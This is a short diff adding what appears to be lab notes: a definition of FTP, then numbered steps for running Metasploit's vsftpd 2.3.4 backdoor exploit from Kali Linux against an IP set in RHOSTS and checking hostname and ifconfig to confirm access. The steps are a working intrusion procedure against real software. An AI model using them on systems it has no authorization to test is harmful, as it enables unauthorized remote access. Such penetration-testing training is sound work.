@@ -1,0 +1,11 @@
+File transfer protocol (FTP) is a standard network protocol used for transferring files between a client and a server on a TCP/IP-based network.
+1.	Open a terminal on Kali Linux
+2.	Put in the ‘msfconsole’ command
+3.	Search vsftpd 2.3.4
+4.	Use the command ‘use 0’
+5.	Show options
+6.	Set RHOSTS “IP ADDRESS”
+7.	exploit
+8.	Hostname
+9.	Ifconfig (for confirmation)
+
